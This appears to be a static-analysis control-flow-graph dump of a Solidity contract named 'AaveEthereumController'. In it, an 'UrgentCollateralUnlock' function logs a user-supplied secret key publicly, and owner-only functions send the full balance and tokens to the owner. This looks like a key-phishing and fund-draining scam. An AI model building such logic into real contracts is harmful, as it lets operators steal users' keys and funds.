Contract: AaveEthereumController
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(controller_aEthWETH_ != address(0),ZERO_ADDRESS_CONTROLLER_aEthWETH)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(controller_aWBTC_ != address(0),ZERO_ADDRESS_CONTROLLER_aWBTC)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(controller_aUSDC_ != address(0),ZERO_ADDRESS_CONTROLLER_aUSDC)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(controller_aDAI_ != address(0),ZERO_ADDRESS_CONTROLLER_aDAI)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(controller_aWETH_ != address(0),ZERO_ADDRESS_CONTROLLER_aWETH)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(controller_aUSDT_ != address(0),ZERO_ADDRESS_CONTROLLER_aUSDT)

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: controller_aEthWETH = controller_aEthWETH_

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: controller_aWBTC = controller_aWBTC_

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: controller_aUSDC = controller_aUSDC_

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: controller_aDAI = controller_aDAI_

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: controller_aWETH = controller_aWETH_

  ID: 12
  Type: NodeType.EXPRESSION
  Expression: controller_aUSDT = controller_aUSDT_

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: SetController(controller_aEthWETH_,aEthWETH)

  ID: 14
  Type: NodeType.EXPRESSION
  Expression: SetController(controller_aWBTC_,aWBTC)

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: SetController(controller_aUSDC_,aUSDC)

  ID: 16
  Type: NodeType.EXPRESSION
  Expression: SetController(controller_aDAI_,aDAI)

  ID: 17
  Type: NodeType.EXPRESSION
  Expression: SetController(controller_aWETH_,aWETH)

  ID: 18
  Type: NodeType.EXPRESSION
  Expression: SetController(controller_aUSDT_,aUSDT)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  12 -> 13
  13 -> 14
  14 -> 15
  15 -> 16
  16 -> 17
  17 -> 18

Function: setFeeRecipient
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(newFeeRecipient != feeRecipient,ALREADY_SET)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: feeRecipient = newFeeRecipient

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: SetFeeRecipient(newFeeRecipient)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 4
  1 -> 2
  2 -> 3
  4 -> 1

Function: setController
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(newController != address(0),ZERO_ADDRESS_CONTROLLER)

  ID: 2
  Type: NodeType.IF
  Expression: keccak256(bytes)(abi.encodePacked(token)) == keccak256(bytes)(aEthWETH)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: controller_aEthWETH = newController

  ID: 4
  Type: NodeType.IF
  Expression: keccak256(bytes)(abi.encodePacked(token)) == keccak256(bytes)(aWBTC)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: controller_aWBTC = newController

  ID: 6
  Type: NodeType.IF
  Expression: keccak256(bytes)(abi.encodePacked(token)) == keccak256(bytes)(aUSDC)

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: controller_aUSDC = newController

  ID: 8
  Type: NodeType.IF
  Expression: keccak256(bytes)(abi.encodePacked(token)) == keccak256(bytes)(aDAI)

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: controller_aDAI = newController

  ID: 10
  Type: NodeType.IF
  Expression: keccak256(bytes)(abi.encodePacked(token)) == keccak256(bytes)(aWETH)

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: controller_aWETH = newController

  ID: 12
  Type: NodeType.IF
  Expression: keccak256(bytes)(abi.encodePacked(token)) == keccak256(bytes)(aUSDT)

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: controller_aUSDT = newController

  ID: 14
  Type: NodeType.EXPRESSION
  Expression: revert(string)(INVALID_TOKEN)

  ID: 15
  Type: NodeType.ENDIF
  Expression: 

  ID: 16
  Type: NodeType.ENDIF
  Expression: 

  ID: 17
  Type: NodeType.ENDIF
  Expression: 

  ID: 18
  Type: NodeType.ENDIF
  Expression: 

  ID: 19
  Type: NodeType.ENDIF
  Expression: 

  ID: 20
  Type: NodeType.ENDIF
  Expression: 

  ID: 21
  Type: NodeType.EXPRESSION
  Expression: SetController(newController,token)

  ID: 22
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 22
  1 -> 2
  2 -> 3
  2 -> 4
  3 -> 20
  4 -> 5
  4 -> 6
  5 -> 19
  6 -> 7
  6 -> 8
  7 -> 18
  8 -> 9
  8 -> 10
  9 -> 17
  10 -> 11
  10 -> 12
  11 -> 16
  12 -> 13
  12 -> 14
  13 -> 15
  14 -> 15
  15 -> 16
  16 -> 17
  17 -> 18
  18 -> 19
  19 -> 20
  20 -> 21
  22 -> 1

Function: UrgentCollateralUnlock
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(bytes(key).length > 0,Key cannot be empty)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: keyHash = keccak256(bytes)(abi.encodePacked(key))

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: UrgentCollateralUnlockTriggered(msg.sender,key,keyHash)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: timeLock
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: amount = address(this).balance

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(amount > 0,NO_BALANCE)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: 

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: (success,None) = owner.call{value: amount}()

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(success,TRANSFER_FAILED)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: TimeLockExecuted(amount,owner)

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 7
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  7 -> 1

Function: loanRepay
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(token != address(0),ZERO_TOKEN_ADDRESS)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(amount > 0,ZERO_AMOUNT)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: success = IERC20(token).transferFrom(msg.sender,address(this),amount)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(success,TRANSFER_FAILED)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: LoanRepaid(msg.sender,token,amount)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5

Function: borrow
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(token != address(0),ZERO_TOKEN_ADDRESS)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(amount > 0,ZERO_AMOUNT)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: success = IERC20(token).transfer(owner,amount)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(success,TRANSFER_FAILED)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: BorrowExecuted(token,amount)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 6
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  6 -> 1

Function: extSloads
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: res = sload(uint256)(slot)

  ID: 3
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 4
  Type: NodeType.RETURN
  Expression: res

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4


Contract: IERC20
==================================================


